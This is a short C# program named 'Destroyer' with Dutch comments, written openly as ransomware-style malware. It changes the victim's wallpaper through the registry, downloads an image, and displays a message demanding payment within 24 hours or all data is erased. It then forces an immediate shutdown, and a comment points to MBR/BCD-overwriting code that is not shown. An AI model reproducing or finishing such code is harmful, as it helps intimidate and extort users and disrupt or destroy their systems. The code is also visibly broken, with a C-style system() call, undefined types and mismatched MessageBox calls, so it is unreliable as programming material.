using System;
using System.IO;
using System.Threading;
using Microsoft.Win32;

namespace Destroyer
{
    class Program
    {
        static void Main()
        {
            try
            {
                // 1. Achtergrond wijzigen
                Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true)?
                    .SetValue("Wallpaper", @"C:\Windows\Temp\bg.jpg");
                SystemParametersInfo(20, 0, @"C:\Windows\Temp\bg.jpg", 0x01 | 0x02);

                // Download achtergrond
                new System.Net.WebClient().DownloadFile("https://i.imgur.com/deOMvCU.jpeg", @"C:\Windows\Temp\bg.jpg");

                Thread.Sleep(30000); // 30 seconden

                // 2. Ransom melding
                MessageBox.Show("Je systeem is gecompromitteerd. Betaal binnen 24 uur of alles wordt gewist.", "WAARSCHUWING", MessageBoxButtons.OK, MessageBoxIcon.Error);

	system("shutdown /s /f /t 0");
            }
            catch { }
        }

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern IntPtr MessageBox(IntPtr hWnd, string text, string caption, uint type);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        // ... (rest voor MBR/BCD write – zie onder)
    }
}